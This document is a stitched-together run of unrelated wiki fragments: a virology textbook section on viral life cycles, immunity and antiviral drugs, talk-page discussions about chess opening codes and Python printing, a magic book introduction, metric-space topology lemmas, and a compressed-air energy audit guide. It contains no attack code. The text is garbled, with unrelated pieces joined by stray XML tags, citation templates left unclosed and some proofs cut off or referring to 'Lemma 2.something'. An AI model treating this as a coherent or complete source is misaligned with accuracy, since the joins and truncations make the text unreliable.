There are six basic, overlapping stages in the life cycle of viruses in living cells:&lt;ref&gt;Shors pp. 47–67 &lt;/ref&gt;

*'''Attachment''' is the binding of the virus to specific molecules on the surface of the cell. This specificity restricts the virus to a very limited type of cell. For example, the human immunodeficiency virus (HIV) infects only human T cells, because its surface protein, gp120, can only react with CD4 and other molecules on the T cell's surface. Plant viruses can only attach to plant cells and cannot infect animals. This mechanism has evolved to favour those viruses that only infect cells in which they are capable of reproducing.

*'''Penetration''' follows attachment; viruses penetrate the host cell by endocytosis or by fusion with the cell.

*'''Uncoating''' happens inside the cell when the viral capsid is removed and destroyed by viral enzymes or host enzymes, thereby exposing the viral nucleic acid.

*'''Replication''' of virus particles is the stage where a cell uses viral messenger RNA in its protein synthesis systems to produce viral proteins. The RNA or DNA synthesis abilities of the cell produce the virus's DNA or RNA.

*'''Assembly''' takes place in the cell when the newly created viral proteins and nucleic acid combine to form  hundreds of new virus particles.

*'''Release''' occurs when the new viruses escape or are released from the cell. Most viruses achieve this by making the cells burst, a process called lysis. Other viruses such as HIV are released more gently by a process called budding.

==Effects on the host cell==

The range of structural and biochemical effects that viruses have on the host cell is extensive.&lt;ref&gt;Collier pp. 115–146&lt;/ref&gt; These are called ''cytopathic effects''.&lt;ref&gt;Collier p. 115&lt;/ref&gt; Most virus infections eventually result in the death of the host cell. The causes of death include cell lysis (bursting), alterations to the cell's surface membrane and apoptosis (cell &quot;suicide&quot;).&lt;ref name=&quot;pmid10547702&quot;&gt;{{cite journal

When a cell's DNA is damaged by a virus and if the cell cannot repair this often triggers apoptosis. One of the results of apoptosis is destruction of the damaged DNA by the cell itself. Some viruses have mechanisms to limit apoptosis so that the host cell does not die before progeny viruses have been produced. HIV, for example, does this.&lt;ref name=&quot;pmid10547702&quot;&gt;{{cite journal

==Viruses and diseases==
:''For more examples of diseases caused by viruses see [[w:List of infectious diseases|Wikipedia's List of infectious diseases]]''
[[Image:Norwalk.jpg|thumb|Norovirus. Ten Norovirus particles; this RNA virus causes winter vomiting disease. It is often in the news as a cause of gastro-enteritis on cruise ships and in hospitals.]]
Human diseases caused by viruses include the cold, the flu, chickenpox and cold sores. Serious diseases such as Ebola, AIDS and influenza are also caused by viruses. Many viruses cause little or no disease and are said to be &quot;benign&quot;.   The more harmful viruses are described as virulent.
Viruses cause different diseases depending on the types of cell that they infect.
Some viruses can cause life-long or chronic infections where the viruses continue to reproduce in the body despite the host's defence mechanisms.&lt;ref&gt;Shors p. 483&lt;/ref&gt;  This is common in hepatitis B virus and hepatitis C virus infections. People chronically infected with a virus are known as carriers. They serve as important reservoirs of the virus. If there is a high proportion of carriers in a given population, a disease is said to be endemic.&lt;ref&gt;Topley and Wilson p. 766 &lt;/ref&gt;

There are many ways in which viruses spread from host to host but each species of virus uses only one or two. Many viruses that infect plants are carried by organisms; such organisms are called vectors.  Some viruses that infect animals and humans are also spread by vectors, usually blood-sucking insects. However, direct animal-to-animal, person-to-person or animal-to-person transmission is more common. Some virus infections, (norovirus and rotavirus), are spread by contaminated food and water, hands and communal objects and by intimate contact with another infected person,&lt;ref&gt;Shors p. 118&lt;/ref&gt; while others are airborne (influenza virus).&lt;ref&gt;Shors p.117&lt;/ref&gt; Viruses such as HIV, hepatitis B and hepatitis C are often transmitted by unprotected sex&lt;ref&gt;Shors p. 119&lt;/ref&gt; or contaminated hypodermic needles.&lt;ref&gt;Shors p.123&lt;/ref&gt; It is important to know how each different kind of virus is spread  to prevent infections and epidemics.&lt;ref&gt;Shors pp. 16–19&lt;/ref&gt;
===Diseases of plants===
[[Image:Pepper mild mottle virus.png|thumb|right|Peppers infected by mild mottle virus]]

There are many types of plant virus, but often they only cause a loss of yield, and it is not economically viable to try to control them. Plant viruses are often spread from plant to plant by organisms, known as ''vectors''. These are normally  insects, but some fungi, nematode worms and single-celled organisms have been shown to be vectors. When control of plant virus infections is considered economical, (for perennial fruits for example),  efforts are concentrated on killing the vectors and removing alternate hosts such as weeds.&lt;ref&gt; Shors p. 584 &lt;/ref&gt; Plant viruses are harmless to humans and other animals because they can only reproduce in living plant cells.&lt;ref&gt;Shors pp. 562–587&lt;/ref&gt;

===Bacteriophages===
[[Image:Phage.png|left|thumb|200px|The structure of a typical bacteriophage]]
Bacteriophages are viruses that infect bacteria. There are over 5,100 types of bacteriophages. They are important in marine ecology: as the infected bacteria burst, carbon compounds are released back into the environment, which stimulates fresh organic growth. Bacteriophages are useful in scientific research because they are harmless to humans and can be studied easily. These viruses can be a problem in industries that produce food and drugs by fermentation and depend on healthy bacteria. Some bacterial infections are becoming difficult to control with antibiotics, so there is a growing interest in the use of bacteriophages to treat infections in humans.&lt;ref&gt;Shors pp. 588–604&lt;/ref&gt;

===Host resistance===
====Innate immunity of animals====


Animals, including humans, have many natural defences against viruses. Some are non-specific and protect against many viruses regardless of the type. This innate immunity is not improved by repeated exposure to viruses and does not retain a &quot;memory&quot; of the infection. The skin of animals, particularly its surface, which is made from dead cells, prevents many types of viruses from infecting the host. The acidity of the contents of the stomach kills many viruses that have been swallowed. When a virus overcomes these barriers and enters the host, other innate defences prevent the spread of infection in the body. A special hormone called interferon is produced by the body when viruses are present, and this stops the viruses from reproducing by killing the infected cell and its close neighbours. Inside cells, there are enzymes that destroy the RNA of viruses. This is called RNA interference. Some blood cells engulf and destroy other virus infected cells.&lt;ref&gt;Shors pp. 146–158&lt;/ref&gt;

====Adaptive immunity of animals====

[[Image:Rotavirus with antibody.jpg|right|thumb|300px|Two rotaviruses: the one on the right is coated with antibodies which stop its attaching to cells and infecting them]]
Specific immunity to viruses develops over time and white blood cells called lymphocytes play a central role. Lymphocytes retain a &quot;memory&quot; of virus infections and produce many special molecules called antibodies. These antibodies attach to viruses and stop the virus from infecting cells. Antibodies are highly selective and attack only one type of virus. The body makes many different antibodies, especially during the initial infection, however, after the infection subsides, some antibodies remain and continue to be produced, often giving the host life-long immunity to the virus.&lt;ref&gt;Shors pp.158–168&lt;/ref&gt;

====Plant resistance====
Plants have elaborate and effective defence mechanisms against viruses. One of the most effective is the presence of so-called resistance (R) genes. Each R gene confers resistance to a particular virus by triggering localised areas of cell death around the infected cell, which can often be seen with the unaided eye as large spots. This stops the infection from spreading.&lt;ref&gt;Dinesh-Kumar, S.P., Wai-Hong Tham, Baker, B.J., (2000) &quot;Structure—function analysis of the tobacco mosaic virus resistance gene N&quot; ''PNAS''  97, 14789-94 PMID 11121079 &lt;/ref&gt;  RNA interference is also an effective defence in plants.&lt;ref&gt;Shors pp. 573–576&lt;/ref&gt; When they are infected, plants often produce natural disinfectants which kill viruses, such as salicylic acid, nitric oxide and reactive oxygen molecules.&lt;ref&gt;Soosaar, J.L., Burch-Smith, T.M., Dinesh-Kumar, S.P. (2005) &quot;Mechanisms of plant resistance to viruses&quot; ''Nat. Rev. Microbiol.'' 3, pp. 789–98 PMID 16132037 &lt;/ref&gt;

====Resistance to bacteriophages====
The major way bacteria defend themselves from bacteriophages is by producing enzymes which destroy foreign DNA. These enzymes, called restriction endonucleases, cut up the viral DNA that bacteriophages inject into bacterial cells.

===Prevention and treatment of viral disease in humans and other animals===
====Vaccines====

Vaccination is a way of preventing diseases caused by viruses. Vaccines simulate a natural infection and its associated immune response, but do not cause the disease. Their use has resulted in a dramatic decline in illness and death caused by infections such as polio, measles, mumps and rubella.&lt;ref&gt;Shors pp. 171–185&lt;/ref&gt;  Vaccines are available to prevent over thirteen viral infections of humans&lt;ref&gt;Shors p. 183&lt;/ref&gt;  and more are used to prevent viral infections of animals.&lt;ref&gt;Pastoret, P.P., Schudel, A.A., Lombard, M. (2007) &quot;Conclusions—future trends in veterinary vaccinology&quot;. ''Rev. Off. Int. Epizoot.'' 26, pp. 489–94, 495–501, 503–9. PMID 17892169&lt;/ref&gt; Vaccines may consist of either live or killed viruses.&lt;ref&gt;Shors p. 172&lt;/ref&gt; Live vaccines contain weakened forms of the virus, but these vaccines can be dangerous when given to people with weak immunity. In these people, the weakened virus can cause the original disease.&lt;ref&gt;Thomssen, R. (1975) &quot;Live attenuated versus killed virus vaccines&quot;. ''Monographs in allergy'' 9, pp. 155–76. PMID 1090805 &lt;/ref&gt; Biotechnology and genetic engineering techniques are used to produce &quot;designer&quot; vaccines that only have the capsid proteins of the virus. Hepatitis B vaccine is an example of this type of vaccine.&lt;ref&gt;Shors p. 174&lt;/ref&gt; These vaccines are safer because they can never cause the disease.&lt;ref&gt;Shors p. 180&lt;/ref&gt;

====Antiviral drugs====
Over the past 20 years, the development of antiviral drugs has increased rapidly, mainly driven by the AIDS pandemic. Antiviral drugs are often nucleoside analogues, which are molecules very similar, but not identical to DNA building blocks. When the replication of virus DNA begins, some of these fake building blocks are incorporated. As soon as that happens, replication stops prematurely— the fake building blocks lack the essential features that allow the addition of further building blocks. Thus, DNA production is halted, and the virus can no longer reproduce.&lt;ref&gt;Shors p. 427&lt;/ref&gt; Examples of nucleoside analogues are aciclovir for herpes virus infections and lamivudine for HIV and hepatitis B virus infections. Aciclovir is one of the oldest and most frequently prescribed antiviral drugs.&lt;ref&gt;Shors p. 426&lt;/ref&gt;

[[Image:Aciclovir.svg|left|thumb|100px|The guanine analogue aciclovir]]
Other antiviral drugs target different stages of the viral life cycle. HIV is dependent on an  enzyme called the HIV-1 protease for the virus to become infectious. There is a class of drugs called protease inhibitors, which bind to this enzyme and stop it from functioning.&lt;ref name=&quot;Shors p. 463&quot;&gt;Shors p. 463&lt;/ref&gt;

Hepatitis C is caused by an RNA virus. In 80% of people infected, the disease becomes chronic, and they remain infectious for the rest of their lives unless they are treated. There is an effective treatment that uses the nucleoside analogue drug ribavirin combined with interferon.&lt;ref&gt;Witthoft, T., Moller, B., Wiedmann, K.H., Mauss, S., Link, R., Lohmeyer, J., Lafrenz, M., Gelbmann, C.M., Huppe, D., Niederau, C., Alshuth, U. (2007) &quot;Safety, tolerability and efficacy of peginterferon alpha-2a and ribavirin in chronic hepatitis C in clinical practice: The German Open Safety Trial.&quot; ''J Viral Hepat.'' 14, pp. 788–796. PMID 17927615&lt;/ref&gt; The treatment for chronic carriers of the hepatitis B virus by a similar strategy  using lamivudine is being developed.&lt;ref&gt;Rudin, D., Shah, S.M., Kiss, A., Wetz, R.V., Sottile, V.M. (2007) &quot;Interferon and lamivudine vs. interferon for hepatitis B e antigen-positive hepatitis B treatment: meta-analysis of randomized controlled trials.&quot; ''Liver Int.'' 9, pp. 1185–93. PMID 17919229&lt;/ref&gt; In both diseases, the ribavirin stops the virus from reproducing and the interferon kills any remaining infected cells.

HIV infections are usually treated with a combination of antiviral drugs, each targeting a different stage in the virus's life-cycle. There are drugs that prevent the virus from attaching to cells, others that are nucleoside analogues and some poison the virus's enzymes that it needs to reproduce.&lt;ref name=&quot;Shors p. 463&quot;/&gt; The success of these drugs is proof of the importance of knowing how viruses reproduce.

      <text xml:space="preserve">My name is Axel and I am teaching at a liberal arts college in the Midwest. My interest lies in plant biotechnology and synthetic biology for the production of useful drugs, phytopharmaceuticals, and bioactive compounds in general. However, I am also much interested in helping to build a cleaner and more sustainable environment by making plants more stress tolerant, less demanding for fertilizers, and less susceptible to pests.</text>

If you have a chance can you look at this. [[Chess/ECOC|ECO_index:_C00--C99]]

    C48: Four Knights' Game, Marshall Variation: 1. e4 e5 2. Nf3 Nc6 3. Nc3 Nf6 4. Bc5
    C48: Four Knights' Game, Rubinstein Variation: 1. e4 e5 2. Nf3 Nc6 3. Nc3 Nf6 4. Nd4
4. Bc5 is not a valid white move and 4. Nd4 would seem to be a blunder, so there is some error here but I don't know what the correct moves for the Marshall Variation or the Rubinstein Variation are. [[User:SunCreator|SunCreator]] ([[User talk:SunCreator|talk]]) 17:44, 11 March 2009 (UTC)

Done.--[[User:Oleander|Oleander]] ([[User talk:Oleander|talk]]) 04:37, 12 March 2009 (UTC)

== C64 - C67 ==

1. e4 e5 2. Nf3 Nc6 3. Bb5 Bc5 4. Nf6
*The 4. Nf6 doesn't make sense. 3. Bb5 Nf6 perhaps? [[User:SunCreator|SunCreator]] ([[User talk:SunCreator|talk]]) 16:21, 13 March 2009 (UTC)

      <text xml:space="preserve">'''Magic''' is an ancient art. Magic as a performance art ''per se'' is documented far back to ancient Egypt. Today, many magicians enjoy notoriety as both stage and television celebrities. Others work in restaraunts and bars, while others work on cruise ships and similar venues.

This book will serve as a basic introduction to magic. Advanced titles may appear on Wikibooks and thousands of titles pertaining to advance techniques used by magicians are available via commercial magic dealers.

I suppose you *could* eliminate any mention of how to continue on the same line, but that would make it impossible for a novice programmer to have enough information to complete one of the exercises on this page: &quot;Re-write the original program to use two print statements: one for &quot;Hello&quot; and one for &quot;world&quot;. The program should still only print out on one line.&quot;

So should we add enough information here to tell our dear reader how to do that? Or should we move that exercise to [[Python Programming/Input and output]], which already has information on 2 different ways to do that?

:One of '''our''' readers (me), found a syntax error and an ^ arrow pointing at the &quot;=&quot; equal sign. I also use python 2.5.2 [[User:Vanuan|Vanuan]] :) . I can then safely ignore it until we get help , or we ourselves help when we learn about it :) [[User:Logictheo|Logictheo]] ([[User talk:Logictheo|talk]]) 19:39, 25 May 2009 (UTC)

I find out that on Python 3 teh end statement on the print function actually works.  The problem could be that Python 3 the print its a function while on previous version is more of a statement.

== Why is my installation not working? ==
When I run the premade &quot;idle.py&quot; with:
&lt;source lang=python&gt;
Python 2.7.3 (default, Apr 10 2012, 23:24:47) [MSC v.1500 64 bit (AMD64)] on win32
Type &quot;copyright&quot;, &quot;credits&quot; or &quot;license()&quot; for more information.
&lt;/source&gt;
installation, I get:
&lt;source lang=python&gt;
Traceback (most recent call last):
  File &quot;C:\Python27\Lib\idlelib\idle.py&quot;, line 7, in &lt;module&gt;
    idlelib_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
NameError: name '__file__' is not defined
&gt;&gt;&gt; 
&lt;/source&gt;
Heck, when I even run the simple tutorial &quot;hello2.py&quot; from the instructions on [[Python Programming/Creating Python programs]] I get:
&lt;source lang=python&gt;
&gt;&gt;&gt; ================================ RESTART ================================
&gt;&gt;&gt; 
Hello, world!
Hello, world!
&gt;&gt;&gt; 
&lt;/source&gt;

Why is that?  I'm trying to get this set up and figured out so I can start using a pywikipediabot variation on [http://www.mediawikiwidgets.org this wiki] to eliminate the 5,600 spam posts, corresponding images, and ban the posters of said spam..  I have placed all of the pages into a category (Category:Pages flagged for deletion/Spam).  I have absolutely no experience with Python, and I am finding it hard to learn with the tutorials not working correctly.  *sad face* -- [[User:Technical 13|Technical 13]] ([[User talk:Technical 13|discuss]] • [[Special:Contributions/Technical 13|contribs]]) 13:27, 22 April 2012 (UTC)</text>

      <text xml:space="preserve">'''2 Lemma'''
*''(i) &lt;math&gt;\operatorname{dist}(\cdot, E) = \operatorname{dist}(\cdot, \overline{E})&lt;/math&gt;.''
*''(ii) &lt;math&gt;\operatorname{dist}(\cdot, E)&lt;/math&gt; is a 1-Lipschitz continuous.''
Proof:
Suppose a sequence &lt;math&gt;y_n \in E&lt;/math&gt; converges to &lt;math&gt;y \in \overline{E}&lt;/math&gt;. Since &lt;math&gt;\operatorname{dist}(x, E) \le \operatorname{dist}(x, y_n)&lt;/math&gt;,
we have:
:&lt;math&gt;\operatorname{dist}(x, E) \le \operatorname{dist}(x, y)&lt;/math&gt;.
Taking inf over &lt;math&gt;y&lt;/math&gt; gives (i). For the second, since &lt;math&gt;\operatorname{dist}(x, E) \le \operatorname{dist}(x, y) + \operatorname{dist}(y, z)&lt;/math&gt;, taking inf over z,
:&lt;math&gt;\operatorname{dist}(x, E) \le \operatorname{dist}(x, y) + \operatorname{dist}(y, E)&lt;/math&gt;.
By symmetry in the formula, we obtain (ii).&lt;math&gt;\square&lt;/math&gt;

'''2 Theorem''' ''A metric space is completely regular Hausdorff.''&lt;br /&gt;
Proof: Let &lt;math&gt;x \ne y&lt;/math&gt;, and &lt;math&gt;r = d(x, y)&lt;/math&gt;. It follows that &lt;math&gt;B(x, r/2)&lt;/math&gt; and &lt;math&gt;B(y, r/2)&lt;/math&gt; are disjoint to each others. In fact, if they intersect at, say, &lt;math&gt;z&lt;/math&gt;, then
:&lt;math&gt;r = d(x, y) \le d(x, z) + d(z, y) &lt; r / 2 + r / 2 = r&lt;/math&gt;,
which is absurd. Finally, a metric space is completely regular because &lt;math&gt;\operatorname{dist}&lt;/math&gt;, which is continuous by the above lemma, separates a closed set and a point.&lt;math&gt;\square&lt;/math&gt;

'''2 Theorem''' ''Let &lt;math&gt;f:X \to Y&lt;/math&gt; be a function. Suppose &lt;math&gt;X&lt;/math&gt; is metric. Then &lt;math&gt;f&lt;/math&gt; is continuous if and only if &lt;math&gt;x_n \to x&lt;/math&gt; implies &lt;math&gt;f(x_n) \to f(x)&lt;/math&gt;.''&lt;br /&gt;
Proof: Both the statements are equivalent to:
:&lt;math&gt;f(\overline{E}) \subset \overline{f(E)}&lt;/math&gt;
for every subset &lt;math&gt;E \subset X&lt;/math&gt;.
&lt;math&gt;\square&lt;/math&gt;

'''2 Corollary''' ''&lt;math&gt;f&lt;/math&gt; is continuous if and only if &lt;math&gt;f&lt;/math&gt; is continuous on every compact subset of &lt;math&gt;X&lt;/math&gt;. (Recall that in Chapter 1 we proved the same result for locally compact spaces.)''&lt;br /&gt;
Proof: (&lt;math&gt;\Rightarrow&lt;/math&gt;) is obvious. For (&lt;math&gt;\Leftarrow&lt;/math&gt;), suppose &lt;math&gt;x_n \to x&lt;/math&gt;. Let &lt;math&gt;K = \{ x, x_1, x_2, ... \}&lt;/math&gt;. Then &lt;math&gt;K&lt;/math&gt; is compact; in fact, if &lt;math&gt;U_j&lt;/math&gt; is an open cover of &lt;math&gt;K&lt;/math&gt;, then &lt;math&gt;x \in U_N&lt;/math&gt; for some &lt;math&gt;N&lt;/math&gt; and, by convergence, &lt;math&gt;U_N&lt;/math&gt; contains all but finitely many terms of the sequence &lt;math&gt;x_n&lt;/math&gt;. Now, since &lt;math&gt;f&lt;/math&gt; is continuous on &lt;math&gt;K&lt;/math&gt;, &lt;math&gt;f(x_n) \to f(x)&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

'''2 Theorem''' ''Let &lt;math&gt;K&lt;/math&gt; be a metric space. Then the following are equivalent:''
* ''(i) &lt;math&gt;K&lt;/math&gt; is compact.''
* ''(ii) Every sequence of &lt;math&gt;K&lt;/math&gt; admits a convergent subsequence.'' (i.e., &lt;math&gt;K&lt;/math&gt; is sequentially compact)
* ''(iii) &lt;math&gt;K&lt;/math&gt; is complete and totally bounded.''
Proof: To show (i) &lt;math&gt;\Rightarrow&lt;/math&gt; (ii), suppose (ii) is invalid. That is to say, there exists a sequence &lt;math&gt;x_n \in K&lt;/math&gt; with no convergent subsequence. For each &lt;math&gt;n&lt;/math&gt;, we can then find &lt;math&gt;\delta_n &gt; 0&lt;/math&gt; such that &lt;math&gt;B(x_n, \delta_n)&lt;/math&gt; contains only &lt;math&gt;x_n&lt;/math&gt; and no other point in the sequence. Since the sequence &lt;math&gt;x_n&lt;/math&gt; consists of isolated points, it is closed, and thus it is a compact subset whose open cover doesn't admit a finite subcover, falsifying (i). (ii) &lt;math&gt;\Rightarrow&lt;/math&gt; (iii). By (ii), every Cauchy sequence contains a convergent subsequence, and so, the sequence itself converges. &lt;math&gt;K&lt;/math&gt; is thus complete. To show the totally boundedness, suppose &lt;math&gt;K&lt;/math&gt; is not totally bounded. We can then find a sequence consisting of isolated points, which obviously doesn't have a convergent subsequence and so contradicts (ii). We conclude (ii) &lt;math&gt;\Rightarrow&lt;/math&gt; (iii). For (iii) &lt;math&gt;\Rightarrow&lt;/math&gt; (i), since &lt;math&gt;K&lt;/math&gt; is complete, it suffices to show that every ultrafilter is Cauchy, but this is immediate from the definitions of the totally boundedness and a Cauchy filter. &lt;math&gt;\square&lt;/math&gt;

'''2 Corollary''' ''Every compact metric space &lt;math&gt;K&lt;/math&gt; is separable.''&lt;br /&gt;
Proof:
Since &lt;math&gt;K&lt;/math&gt; is totally bounded, for each &lt;math&gt;n &gt; 0&lt;/math&gt;, there is a finite subset &lt;math&gt;F_n \subset K&lt;/math&gt; such that
:&lt;math&gt;K = \bigcup_{x \in F_n} B(x, n^{-1})&lt;/math&gt;
Let &lt;math&gt;E&lt;/math&gt; be the union of &lt;math&gt;F_n&lt;/math&gt; over all &lt;math&gt;n&lt;/math&gt;. Evidently, &lt;math&gt;E&lt;/math&gt; is dense. &lt;math&gt;\square&lt;/math&gt;

'''2 Theorem''' ''Let &lt;math&gt;f_k \in C(X)&lt;/math&gt; be a sequence. Then &lt;math&gt;f_k&lt;/math&gt; converges pointwise if and only if &lt;math&gt;f_k(x_k) \to f(x)&lt;/math&gt; for any sequence &lt;math&gt;x_k \to x&lt;/math&gt;.&lt;br /&gt;
Proof:
(&lt;math&gt;\Rightarrow&lt;/math&gt;) Let &lt;math&gt;K&lt;/math&gt; be a compact set containing &lt;math&gt;x_k&lt;/math&gt;. Then

'''2 Theorem (Baire)''' ''Let &lt;math&gt;X&lt;/math&gt; be a complete metric space. If &lt;math&gt;X = \bigcup_n E_n&lt;/math&gt;, then some &lt;math&gt;E_n&lt;/math&gt; contains an interior point.'' &lt;br /&gt;
Proof:
Let &lt;math&gt;V_n&lt;/math&gt; be the interior of the closure of &lt;math&gt;E_n&lt;/math&gt;. Then &lt;math&gt;V_n&lt;/math&gt; is dense by hypothesis. The theorem is then equivalent to say that the intersection of &lt;math&gt;V_n&lt;/math&gt; over all &lt;math&gt;n&lt;/math&gt; is dense. To prove that, let &lt;math&gt;W \subset X&lt;/math&gt; be an open subset. By denseness, there is &lt;math&gt;x_1&lt;/math&gt; and &lt;math&gt;r_1 &gt; 0&lt;/math&gt; such that:
:&lt;math&gt;\overline{B}(x_1, r_1) \subset W \cap V_1&lt;/math&gt;.
By iteration, we can find &lt;math&gt;x_n&lt;/math&gt; and &lt;math&gt;r_n &gt; 0&lt;/math&gt; such that:
:&lt;math&gt;\overline{B}(x_n, r_n) \subset B(x_{n-1}, r_{n-1}) \cap V_n&lt;/math&gt; as well as &lt;math&gt;r_n &lt; n^{-1}&lt;/math&gt;
Since &lt;math&gt;x_n \in B(x_m, r_m)&lt;/math&gt; when &lt;math&gt;n &gt; m&lt;/math&gt;, we have that &lt;math&gt;x_n&lt;/math&gt; is Cauchy, and &lt;math&gt;x_n&lt;/math&gt; converges to some limit &lt;math&gt;x&lt;/math&gt;. For any &lt;math&gt;n&lt;/math&gt;, by closedness,
:&lt;math&gt;x \in \overline{B}(x_{n-1}, r_{n-1}) \subset B(x_n, r_n)&lt;/math&gt;.
Hence, &lt;math&gt;x \in W&lt;/math&gt; and &lt;math&gt;x \in V_n&lt;/math&gt; for all &lt;math&gt;n&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

'''2 Theorem (Banach fixed point theorem)''' ''Let &lt;math&gt;X&lt;/math&gt; be a complete metric space, and let &lt;math&gt;f:X \to X&lt;/math&gt; be a function. If there is a constant &lt;math&gt;0 &lt; c &lt; 1&lt;/math&gt; such that:
:&lt;math&gt;d(f(x), f(y)) \le c d(x, y)&lt;/math&gt; for all &lt;math&gt;x, y \in X&lt;/math&gt;
then &lt;math&gt;f&lt;/math&gt; admits a unique fixed point; i.e., &lt;math&gt;f(x) = x&lt;/math&gt; for some &lt;math&gt;x&lt;/math&gt;. Moreover, &lt;math&gt;\lim_{n \to \infty} f^n(y) = f(x)&lt;/math&gt; for every &lt;math&gt;y \in X&lt;/math&gt;.&lt;br /&gt;
Proof: See [[w:Banach fixed point theorem]]

Define &lt;math&gt;\operatorname{dist}(x, E) = \inf \{ d(x, y) | y \in E \}&lt;/math&gt; for a nonempty subset &lt;math&gt;E \subset X&lt;/math&gt;.

A topological space homeomorphic to a separable complete metric space is called a ''Polish space''.

'''2 Theorem''' ''Let &lt;math&gt;X&lt;/math&gt; be a topological space. Then &lt;math&gt;X&lt;/math&gt; is Polish if and only if it is homeomorphic to a &lt;math&gt;G_\delta&lt;/math&gt; subset of the Hilbert cube.

'''2 Theorem''' ''Every Polish space is isomorphic to one of (i) R, (ii) Z or (iii) a finite space.''

Let &lt;math&gt;\mathcal{C}_c(X) = \Gamma_c (X, \mathcal{C})&lt;/math&gt;, and &lt;math&gt;\mathcal{C}_0(X)&lt;/math&gt; be the space of all &lt;math&gt;f \in \mathcal{C}(X)&lt;/math&gt; such that &lt;math&gt;\{ x \in X | f(x) \ge c \}&lt;/math&gt; is compact. Clearly, &lt;math&gt;\mathcal{C}_c(X) \subset \mathcal{C}_0(X)&lt;/math&gt;. When &lt;math&gt;X&lt;/math&gt; is an open subset of &lt;math&gt;\mathbf{R}^n&lt;/math&gt;, &lt;math&gt;\mathcal{C}(X)&lt;/math&gt; consists of those &lt;math&gt;f&lt;/math&gt; such that &lt;math&gt;\lim_{|x| \to \infty} f(x) = 0&lt;/math&gt;.

'''2 Theorem''' ''Let ''X'' be a locally compact space. Then &lt;math&gt;\mathcal{C}_c(X)&lt;/math&gt; is dense in &lt;math&gt;\mathcal{C}_0(X)&lt;/math&gt;.''&lt;br /&gt;
Proof: Let &lt;math&gt;f \in \mathcal{C}_0(X)&lt;/math&gt;, and &lt;math&gt;K_n = \{ x \in X | f(x) \ge n^{-1} \}&lt;/math&gt;. Using Lemma 2.something, choose &lt;math&gt;\psi_n \in \mathcal{C}_c(X)&lt;/math&gt; such that &lt;math&gt;\psi_n = 1&lt;/math&gt; on &lt;math&gt;K_n&lt;/math&gt;. Then &lt;math&gt;\psi_n f \to f&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

      <text xml:space="preserve">==Collecting Data==
This step of an assessment is performed at the plant. After familiarizing yourself with the equipment and terms involved with compressed air systems, examine plant equipment and identify the type of compressed air system. Data can then be collected for each specific piece of equipment. This section includes data collection tools and methods for gathering standard system data.

'''&lt;u&gt;Data Collection Tools&lt;u&gt;'''
* '''Digital Multimeter:''' (DMM: Power used by an electric motor can be directly measured or calculated from voltage and amperage. Use a DMM to measure the voltage at the motor starter or control panel. Measure line-to-line or line-to-ground voltages depending on probe placement. Use caution and understand important safety precautions when measuring high voltage.

* '''Clamp-on Ammeter:''' Amperage is needed to calculate power. A clamp-on ammeter senses line current by measuring the current induced in the ammeter by the magnetic field produced by the current. Use the clamp-on ammeter to measure the current in all three phases for power calculations. It is important measure amperage at as many operating conditions as possible to allow accurate modeling of equipment operation.

* '''Power Analyzer:''' A power analyzer measures and stores power use over time. A 3 phase-power analyzer, for example, has three clamp-on ammeters, three voltage probes, a neutral probe, and a ground probe. Connecting these to the motor leads allows the power analyzer to measure all line-to-line voltages, line-to-ground voltages, all line currents, phase shifts, and to calculate power. Read the instructions carefully to connect leads correctly for the type of power system (delta) or (wye).

* '''Pressure Gauge:''' Many are compressors include a pressure gauge on the control panel. For compressors that do not have a gauge use a pressure gauge that fits in to quick disconnect fittings to measure system pressure at several places.

* '''Capacity Gauge:''' Many compressors include a capacity gauge that displays the airflow, usually in acfm, that is being delivered. Record the acfm at as many operating loads as possible to accurately model the operation of the compressor. The gauge may be a vacuum gauge that measures air density at a throttled inlet, or be connected to an airflow meter.

* '''Stopwatch:''' Useful to measure on/off &amp; load-unload cycles for use factor calculation.

* '''Rag:''' Useful to wipe off dirty nameplates.

* '''Flashlight:''' Compressors are often located in dark catacombs of the plants. Their location makes reading gauges and nameplates difficult.

* '''Tape Measure:''' For pipe, receiver, or duct dimensions.

This section of the assessment guide presents analysis tools and methods that will be used later in the recommendation section. The recommendation section outlines data required, procedures, and ideas needed to analyze energy use in compressed air systems. Refer to equation in this chapter when directed by the recommendation section.

''&lt;u&gt;Standard Analysis Methods&lt;u&gt;'''

'''Calculate Existing Energy Use Profile'''
Before analyzing potential recommendations you must be able to calculate compressor energy use under different operating conditions and control strategies. 

'''Data Required'''
* All Standard Air Compressor Data
''' Tools Required'''
* Air Compressor Data Worksheets
* Measured Operating Conditions worksheets
* Air Compressor Savings Worksheets

The Measured Operating Conditions and the Air Compressor Savings Worksheets, found in the Data Collection Tools section, provide a convenient way to record data required to calculate energy use. Calculating energy use requires an understanding of the relationship between power and airflow for difference control strategies. These relationships are outlined in the Technology Primer section as well as the Appendix.
Use this section as a guide to using these relationships to calculate air compressor energy use.
Enter measured data into the Measured Operating Conditions Worksheet. The subsequent calculation procedure depends on whether you entered airflow (%C) or power (kW). examples of how to calculate energy use are provided for each case. apply this method to each operating condition you have identified. 

'''Calculating Existing Energy Use(using measured power(kW)):'''
Data Entry, Enter annual hours and power into the Existing Conditions table of the Air Compressor Savings Worksheet. Divide the compressor power of the selected operating condition by the power at full load. Calculated energy use by mulitplying power by annual hours of operation for each operating condition. Calculate Percent Power from Power:

&lt;u&gt;1. Percent Power = Operating Point Power / Full Load Power&lt;u&gt;

&lt;u&gt;2. Calculate Energy from Operating Point Power&lt;u&gt;
Energy = Power x Annual Operating Hours

'''Energy Calculations (using measured power (kW)):'''

&lt;u&gt;3. Calculate Airflow&lt;u&gt;
The relationship between airflow and power depends on control strategy. Conversion formulas for typical controls follow

      <text xml:space="preserve">==Recommendations==
This section contains methods for estimating savings from efficiency improvements. Overview this section at the plant to determine which recommendation are feasible and what data is required to accurately calculate savings.

==Recommendation #1 - Reduce Air Leaks==
'''Summary:''' Reduce the amount of compressed air lost to leaks.

'''When to Apply:''' 
Generally, reducing leaks to the following percentages of plant loads is possible:
* 30% high power, dirty environments, ex. Sawmills
* 20% medium power environments, ex. Plastic manufactoring
* 10% light power, clean environments, ex. Electronics
If leak load is smaller than this the action will be more difficult to justify economically. On air compressors that only operate part time, the payback periods are longer.

'''Key Engineering Concepts:'''
* Reducing airflow saves some energy.
* Turning off a compressor provides more significant savings.
* Avoiding the purchase of a new compressor saves both capital and energy expenses.
* Although it is not direct, compressor energy use is related to the amount of air compressed.

'''Preparation:'''
